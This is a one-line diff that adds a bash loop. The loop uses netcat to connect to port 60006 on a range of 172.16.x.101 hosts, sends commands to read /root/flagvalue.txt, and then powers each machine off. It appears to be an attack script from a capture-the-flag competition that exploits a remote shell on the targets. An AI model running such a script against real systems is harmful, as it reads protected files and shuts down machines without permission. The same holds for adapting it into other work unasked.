@@ -1,0 +1,1 @@
+for i in {101..130};do (sleep 1;echo "echo 172.16.$i.101";sleep 1;echo "cat /root/flagvalue.txt";echo "poweroff";echo "exit")|nc 172.16.$i.101 60006;done
